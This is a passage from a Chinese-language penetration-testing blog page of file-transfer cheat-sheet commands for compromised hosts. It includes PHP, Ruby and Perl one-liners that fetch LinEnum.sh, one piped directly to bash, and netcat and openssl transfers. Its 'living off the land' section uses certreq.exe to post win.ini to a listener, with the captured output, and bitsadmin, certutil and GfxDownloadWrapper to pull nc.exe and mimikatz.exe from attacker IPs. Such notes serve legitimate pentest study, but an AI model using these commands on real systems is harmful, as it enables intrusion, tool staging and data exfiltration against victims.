<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$file = file_get_contents(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); file_put_contents(&quot;LinEnum.sh&quot;,$file);&#x27;</span><br><span class="line"></span><br><span class="line">php -r &#x27;const BUFFER = 1024; $fremote = </span><br><span class="line">fopen(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;rb&quot;); $flocal = fopen(&quot;LinEnum.sh&quot;, &quot;wb&quot;); while ($buffer = fread($fremote, BUFFER)) &#123; fwrite($flocal, $buffer); &#125; fclose($flocal); fclose($fremote);&#x27;</span><br><span class="line"></span><br><span class="line">php -r &#x27;$lines = @file(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); foreach ($lines as $line_num =&gt; $line) &#123; echo $line; &#125;&#x27; | bash</span><br></pre></td></tr></table></figure>

<h2 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -e &#x27;require &quot;net/http&quot;; File.write(&quot;LinEnum.sh&quot;, Net::HTTP.get(URI.parse(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;)))&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use LWP::Simple; getstore(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc 10.10.10.10 9001 &lt; file.exe</span><br><span class="line">nc -lp 8000 &gt; file.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重定向符可颠倒</span></span><br></pre></td></tr></table></figure>

<h1 id="Encrypted-transmission"><a href="#Encrypted-transmission" class="headerlink" title="Encrypted transmission"></a>Encrypted transmission</h1><h2 id="Invoke-AESEncryption-ps1"><a href="#Invoke-AESEncryption-ps1" class="headerlink" title="Invoke-AESEncryption.ps1"></a>Invoke-AESEncryption.ps1</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-AESEncryption</span>.ps1</span><br></pre></td></tr></table></figure>

<p>加密</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Invoke-AESEncryption</span> <span class="literal">-Mode</span> Encrypt <span class="literal">-Key</span> <span class="string">&quot;p4ssw0rd&quot;</span> <span class="literal">-Path</span> .\scan<span class="literal">-results</span>.txt</span><br><span class="line"></span><br><span class="line">File encrypted to C:\\scan<span class="literal">-results</span>.txt.aes</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">-a----</span>        <span class="number">11</span>/<span class="number">18</span>/<span class="number">2020</span>  <span class="number">12</span>:<span class="number">17</span> AM           <span class="number">9734</span> <span class="built_in">Invoke-AESEncryption</span>.ps1</span><br><span class="line"><span class="literal">-a----</span>        <span class="number">11</span>/<span class="number">18</span>/<span class="number">2020</span>  <span class="number">12</span>:<span class="number">19</span> PM           <span class="number">1724</span> scan<span class="literal">-results</span>.txt</span><br><span class="line"><span class="literal">-a----</span>        <span class="number">11</span>/<span class="number">18</span>/<span class="number">2020</span>  <span class="number">12</span>:<span class="number">20</span> PM           <span class="number">3448</span> scan<span class="literal">-results</span>.txt.aes</span><br><span class="line"></span><br><span class="line">&lt;SNIP	&gt;</span><br></pre></td></tr></table></figure>

<p>解密</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Invoke-AESEncryption</span> <span class="literal">-Mode</span> Decrypt <span class="literal">-Key</span> <span class="string">&quot;p4ssw0rd&quot;</span> <span class="literal">-Path</span> .\scan<span class="literal">-results</span>.aes</span><br></pre></td></tr></table></figure>

<h2 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h2><p>加密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc</span><br><span class="line"></span><br><span class="line">enter aes-256-cbc encryption password:                                                         </span><br><span class="line">Verifying - enter aes-256-cbc encryption password:                              </span><br></pre></td></tr></table></figure>

<p>解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    </span><br><span class="line"></span><br><span class="line">enter aes-256-cbc decryption password:	</span><br></pre></td></tr></table></figure>

<h1 id="Living-off-The-Land"><a href="#Living-off-The-Land" class="headerlink" title="Living off The Land"></a>Living off The Land</h1><p><a target="_blank" rel="noopener" href="https://lolbas-project.github.io/#">LOLBAS for Windows</a>和<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins for Linux</a>，是可以搜索用于不同功能的二进制文件的网站。</p>
<h2 id="LOLBAS"><a href="#LOLBAS" class="headerlink" title="LOLBAS"></a>LOLBAS</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1729649886592.jpg" alt="lolbas_upload"></p>
<h3 id="certreq-exe"><a href="#certreq-exe" class="headerlink" title="certreq.exe"></a>certreq.exe</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">certreq.exe</span> -<span class="title">Post</span> -<span class="title">config</span> <span class="title">http</span>://192.168.49.128:8000/ <span class="title">c</span>:\<span class="title">windows</span>\<span class="title">win.ini</span></span></span><br><span class="line"><span class="function"><span class="title">Certificate</span> <span class="title">Request</span> <span class="title">Processor</span>: <span class="title">The</span> <span class="title">operation</span> <span class="title">timed</span> <span class="title">out</span> 0<span class="title">x80072ee2</span> (<span class="title">WinHttp</span>: 12002 <span class="title">ERROR_WINHTTP_TIMEOUT</span>)</span></span><br></pre></td></tr></table></figure>

<p>necat 接收</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nc -lvnp 8000</span><br><span class="line"></span><br><span class="line">listening on [any] 8000 ...</span><br><span class="line">connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)</span><br><span class="line">Content-Length: 92</span><br><span class="line">Host: 192.168.49.128:8000</span><br><span class="line"></span><br><span class="line">; for 16-bit app support</span><br><span class="line">[fonts]</span><br><span class="line">[extensions]</span><br><span class="line">[mci extensions]</span><br><span class="line">[files]</span><br><span class="line">[Mail]</span><br><span class="line">MAPI=1</span><br></pre></td></tr></table></figure>

<h3 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; bitsadmin /transfer wcb /priority foreground http://<span class="number">10.10</span>.<span class="number">15.66</span>:<span class="number">8000</span>/nc.exe C:\Users\<span class="literal">-student</span>\Desktop\nc.exe</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> bitstransfer; <span class="built_in">Start-BitsTransfer</span> <span class="literal">-Source</span> <span class="string">&quot;http://10.10.10.32:8000/nc.exe&quot;</span> <span class="literal">-Destination</span> <span class="string">&quot;C:\Windows\Temp\nc.exe&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">certutil.exe</span> -<span class="title">verifyctl</span> -<span class="title">split</span> -<span class="title">f</span> <span class="title">http</span>://10.10.10.32:8000/<span class="title">nc.exe</span></span></span><br></pre></td></tr></table></figure>

<h3 id="GfxDownloadWrapper-exe"><a href="#GfxDownloadWrapper-exe" class="headerlink" title="GfxDownloadWrapper.exe"></a>GfxDownloadWrapper.exe</h3><p>Windows 10 的英特尔显卡驱动程序</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; GfxDownloadWrapper.exe <span class="string">&quot;http://10.10.10.132/mimikatz.exe&quot;</span> <span class="string">&quot;C:\Temp\nc.exe&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="GTFOBins"><a href="#GTFOBins" class="headerlink" title="GTFOBins"></a>GTFOBins</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1729646319842.jpg" alt="gtfobins_download"></p>
<h3 id="openssl-1"><a href="#openssl-1" class="headerlink" title="openssl"></a>openssl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem</span><br><span class="line"></span><br><span class="line">Generating a RSA private key</span><br><span class="line">.......................................................................................................+++++</span><br><span class="line">................+++++</span><br><span class="line">writing new private key to &#x27;key.pem&#x27;</span><br><span class="line">-----</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="line">There are quite a few fields but you can leave some blank</span><br><span class="line">For some fields there will be a default value,</span><br><span class="line">If you enter &#x27;.&#x27;, the field will be left blank.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [AU]:</span><br><span class="line">State or Province Name (full name) [Some-State]:</span><br><span class="line">Locality Name (eg, city) []:</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:</span><br><span class="line">Organizational Unit Name (eg, section) []:</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:</span><br><span class="line">Email Address []:</span><br></pre></td></tr></table></figure>

<p>启动服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh</span><br></pre></td></tr></table></figure>

<p>在 taeget 下载文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client -connect 10.10.10.32:80 -quiet &gt; LinEnum.sh</span><br></pre></td></tr></table></figure>

	  <!--
<div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>
-->
	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/10/07/pentest/service/Attacking Common Services/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/09/30/pentest/lateral/Shells/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-10-02 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Pentest/">Pentest<span>16</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/Lateral-Movement/">Lateral-Movement<span>3</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Web"><span class="toc-article-text">Web</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Basic"><span class="toc-article-text">Basic</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Nginx-PUT"><span class="toc-article-text">Nginx PUT</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#ssh"><span class="toc-article-text">ssh</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#scp"><span class="toc-article-text">scp</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Powershell"><span class="toc-article-text">Powershell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Web-Download"><span class="toc-article-text">Web Download</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Fileless"><span class="toc-article-text">Fileless</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Invoke-WebRequest"><span class="toc-article-text">Invoke-WebRequest</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PowerShell-Session"><span class="toc-article-text">PowerShell Session</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Base64"><span class="toc-article-text">Base64</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Linux"><span class="toc-article-text">Linux</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#windows"><span class="toc-article-text">windows</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#SMB"><span class="toc-article-text">SMB</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Impacket-smbserver"><span class="toc-article-text">Impacket smbserver</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Windows"><span class="toc-article-text">Windows</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Linux-1"><span class="toc-article-text">Linux</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#FTP"><span class="toc-article-text">FTP</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Python3-pyftpdlib"><span class="toc-article-text">Python3 pyftpdlib</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Windows-1"><span class="toc-article-text">Windows</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Linux-2"><span class="toc-article-text">Linux</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#RDP"><span class="toc-article-text">RDP</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#mount-linux-folder"><span class="toc-article-text">mount linux folder</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#rdesktop"><span class="toc-article-text">rdesktop</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#xfreerdp"><span class="toc-article-text">xfreerdp</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#connect"><span class="toc-article-text">connect</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#mount-windows-folder"><span class="toc-article-text">mount windows folder</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Language"><span class="toc-article-text">Language</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#python"><span class="toc-article-text">python</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#php"><span class="toc-article-text">php</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ruby"><span class="toc-article-text">ruby</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#perl"><span class="toc-article-text">perl</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#nc"><span class="toc-article-text">nc</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Encrypted-transmission"><span class="toc-article-text">Encrypted transmission</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Invoke-AESEncryption-ps1"><span class="toc-article-text">Invoke-AESEncryption.ps1</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#openssl"><span class="toc-article-text">openssl</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Living-off-The-Land"><span class="toc-article-text">Living off The Land</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#LOLBAS"><span class="toc-article-text">LOLBAS</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#certreq-exe"><span class="toc-article-text">certreq.exe</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Bitsadmin"><span class="toc-article-text">Bitsadmin</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Certutil"><span class="toc-article-text">Certutil</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#GfxDownloadWrapper-exe"><span class="toc-article-text">GfxDownloadWrapper.exe</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#GTFOBins"><span class="toc-article-text">GTFOBins</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#openssl-1"><span class="toc-article-text">openssl</span></a></li></ol></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 n2ryx's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
